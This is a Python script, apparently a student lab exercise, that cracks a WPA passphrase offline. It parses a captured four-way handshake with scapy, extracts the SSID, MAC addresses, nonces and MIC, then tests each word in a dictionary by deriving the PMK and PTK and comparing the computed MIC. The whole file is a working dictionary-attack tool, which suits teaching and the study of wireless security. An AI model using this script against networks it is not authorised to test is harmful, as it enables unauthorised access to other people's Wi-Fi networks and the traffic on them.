"""
Source : https://fossies.org/dox/scapy-2.4.2/classscapy_1_1plist_1_1PacketList.html
Authors:  Edin Mujkanovic, Taesuk Joung, Victor Truan
Utility : This script can find a WPA passphrase if it is in dictionnary present with the programm
          by testing all the passphrase and compare the calculated MIC with the stolen one.
          When they are the same the passphrase is the good one.
"""

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex  # contains function to calculate 4096 rounds on passphrase and SSID
import hmac, hashlib

# Function take from the recived script.

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

wpa=rdpcap("wpa_handshake.cap")

# wpa[5] is the first frame of the handshake
# Both client and AP are available in a lot of frame, we choose to take them from the first of the handshake.
APmac = a2b_hex(str.replace(wpa[5].addr2, ":", ""))
Clientmac = a2b_hex(str.replace(wpa[5].addr1, ":", ""))

# wpa[0] is the first frame of the pcap, it contains information about the wifi.
# We use this frame to recover the SSID
ssid = wpa[0].info

# To recover the first Nonce, we read the raw data and extract hex values between indexes 26 and 90 from the first
# paquet of the handshake.
ANonce = a2b_hex(b2a_hex(wpa[5].load)[26:90])

# To recover the second nonce, we need to use the second handshake message with the sames indexes.
SNonce =  a2b_hex(b2a_hex(wpa[6].load)[26:90])

# This string is used in the pseudo-random function and should never be modified
# He was in the script we received to understand how WPA works.
# We did not change it.
A           = "Pairwise key expansion"
B           = min(APmac, Clientmac)+max(APmac, Clientmac)+min(ANonce, SNonce)+max(ANonce, SNonce)

# This is the MIC that we want to have.
# We recover it from the last frame of the handshake.
wantedMic = b2a_hex(wpa[8].load[77:93])

# To have the correct data, we must change the last bytes to remove the MIC and put '0' instead and add the version,
# type and data length in front of the payload in the last frame of the handshake.
version = hex(wpa[8][EAPOL].version)[2:].zfill(2)
type = hex(wpa[8][EAPOL].type)[2:].zfill(2)
len = hex(wpa[8][EAPOL].len)[2:].zfill(4)
data = a2b_hex(version+type+len+b2a_hex(wpa[8].load)[:140]+"0"*50)

# Now that we have all the information, we can try to find it with a dictionary attack
dictPath = "./dict"
dictFile = open(dictPath)
currentWord = dictFile.readline()
while currentWord != "":
    currentWord = currentWord[:-1]
    pmk = pbkdf2_hex(currentWord, ssid, 4096, 32)

    # expand pmk to obtain PTK
    ptk = customPRF512(a2b_hex(pmk), A, B)
    print("The current tested word is : " + currentWord)
    # calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16], data, hashlib.sha1)
    MIC_hex_truncated = mic.hexdigest()[0:32]
    # When the MICs are the same we print the word and quit the execution.
    if MIC_hex_truncated == wantedMic:
        print("Congratulations! " + currentWord + " is the passphrase!")
        print("+++" + currentWord + "+++")
        exit(1)
    currentWord = dictFile.readline()
